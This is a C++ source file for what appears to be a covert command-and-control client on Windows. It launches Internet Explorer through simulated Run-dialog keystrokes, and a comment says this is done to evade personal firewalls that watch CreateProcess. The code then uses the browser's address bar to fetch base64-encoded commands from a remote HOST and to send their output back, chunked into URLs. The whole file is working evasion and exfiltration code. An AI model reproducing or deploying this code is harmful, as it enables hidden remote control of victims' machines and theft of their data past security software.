#include "ie.h"
#include "base64.h"
#include "panic.h"
#include <stdlib.h>

IE::IE()
{
	_createProcess();
	_findWindowHandle();
	
	strcpy(_poll, HOST);
	strcat(_poll, POLL);

	strcpy(_response, HOST);
	strcat(_response, RESPONSE); 
}

	
IE::~IE()
{
	PostMessage(_ie, WM_CLOSE, 0, 0);
}


void IE::_gotoUrl(const char* url)
{
	SendMessage(_url, WM_SETTEXT, (WPARAM) 0, (LPARAM) url);
	PostMessage(_url, WM_SETFOCUS, 0, 0);
	PostMessage(_url, WM_KEYDOWN, VK_RETURN, (LPARAM) 0);
}
	
char* IE::getCommand() 
{ 
	_gotoUrl(_poll);
	char* response = _getResponse();
	
	if (strlen(response) == 0) return NULL;

	return b64decode(response);
}

void IE::sendResult(const char* result)
{
	const size_t bytesPerCall = MAX_URL_SIZE - sizeof(HOST) - sizeof(RESULT) - 1;
	char buffer[MAX_URL_SIZE];
	buffer[MAX_URL_SIZE - 1] = 0;
	
	strcpy(buffer, HOST);
	strcat(buffer, BEGIN);
	_gotoUrl(buffer);
	_getResponse();

	char* encoded = b64encode(result);
	if (encoded == NULL) {
		panic("failed to encode result\n");
		return;
	}
	size_t len = strlen(encoded);
	
	strcpy(&buffer[sizeof(HOST) - 1], RESULT);
	for (size_t i=0; i < len; i += bytesPerCall) {
		strncpy(&buffer[sizeof(HOST) + sizeof(RESULT) - 2], &encoded[i], bytesPerCall);	
		_gotoUrl(buffer);
		_getResponse();
	}

	free(encoded);

	strcpy(&buffer[sizeof(HOST) - 1], END);
	_gotoUrl(buffer);
	_getResponse();

}



char* IE::_getResponse() 
{
	static char buffer[MAX_URL_SIZE];

	while (1) {
		SendMessage(_url, WM_GETTEXT, sizeof(buffer), (LPARAM) buffer);
		if (strncmp(buffer, _response, strlen(_response)) == 0) {
			return &buffer[strlen(_response)];
		} else {
			Sleep(500);
		}
	}
}


/*
  this is the old version of _createProcess.
  As some personal firewalls check CreateProcess we found a new solution. 
  See below

void IE::_createProcess()
{
	STARTUPINFO si;
		
	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOWNORMAL;

	if (! CreateProcess(NULL,
		"C:\\Programme\\Internet Explorer\\iexplore.exe",
		NULL,
		NULL,
		0,
		NORMAL_PRIORITY_CLASS,
		NULL,
		NULL,
		&si,
		&_pi)) 
	{
		panic("CreateProcess");
		ExitProcess(-1);
	} else {

	}
}
*/

void IE::_createProcess()
{
	HWND runas, combobox;
	HWND explorer = FindWindow("Shell_TrayWnd", NULL);

	PostMessage(explorer, WM_HOTKEY, 0x1f4, 0x520008);

    // this works only for german versions of Windows
    // If you have a different language adjust the window's name
	while ((runas = FindWindowEx(NULL, NULL, NULL, "Ausführen")) == NULL)
		Sleep(50);

	while ((combobox = FindWindowEx(runas, NULL, "ComboBox", NULL)) == NULL)
		Sleep(50);

	SendMessage(combobox, WM_SETTEXT, 0, (LPARAM) "%PROGRAMFILES%\\Internet Explorer\\IEXPLORE.EXE");
	PostMessage(combobox, WM_KEYDOWN, VK_SPACE, 0);
	PostMessage(combobox, WM_KEYDOWN, VK_RETURN, 0);
}

void IE::_findWindowHandle()
{
	HWND wrk, tb, cbx, cb;

	_ie = NULL;
	while (1) {
		_ie = FindWindowEx(NULL, NULL, "IEFrame", NULL);
		if (_ie) {
			break;
		} else {
			Sleep(500);
		}
	}


	while ((wrk = FindWindowEx(_ie, NULL, "WorkerW", NULL)) == NULL) Sleep(50);
	while ((tb = FindWindowEx(wrk, NULL, "ReBarWindow32", NULL)) == NULL) Sleep(50);
	while ((cbx = FindWindowEx(tb, NULL, "ComboBoxEx32", NULL)) == NULL) Sleep(50);
	while ((cb = FindWindowEx(cbx, NULL, "ComboBox", NULL)) == NULL) Sleep(50);
	while ((_url = FindWindowEx(cb, NULL, "Edit", NULL)) == NULL) Sleep(50);
}
